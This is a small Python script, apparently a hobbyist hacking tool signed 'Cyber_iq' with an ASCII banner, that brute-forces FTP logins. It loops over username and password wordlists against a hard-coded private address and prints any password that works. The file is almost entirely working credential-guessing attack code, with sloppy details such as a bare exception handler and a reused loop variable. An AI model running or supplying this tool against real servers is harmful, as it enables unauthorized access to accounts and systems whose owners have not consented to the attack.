import ftplib
import os
import requests
import os
import time
import sys
Banner5 = """
         _nnnn_
        dGGGGMMb
       @p~qp~~qMb
       M|@||@) M|
       @,----.JM|
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMP|   .'
     `-'       `--' Coder by Cyber_iq"""
x=os.system('clear')
def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.05)
print_slow("    instagram ---> @Cyber_iq")

print(Banner5)
xXx=("enter Tow to start brut :->->->->->->->->->->->->->->->->->->")
print_slow(xXx)
input("")
host="192.168.56.3"
user=open('user.txt','r').read().splitlines()
psw=open('pass.txt','r').read().splitlines()

for p in user:
    for i in psw:
        try:
            ftp = ftplib.FTP(host, p, i)
            print('===================================')
            print("its correct pass==", '[!]', i, '[!]')
            print('===================================')
        except:
            print(i + ' >>>> not corcct password ')
            i = len(i)
            print(i)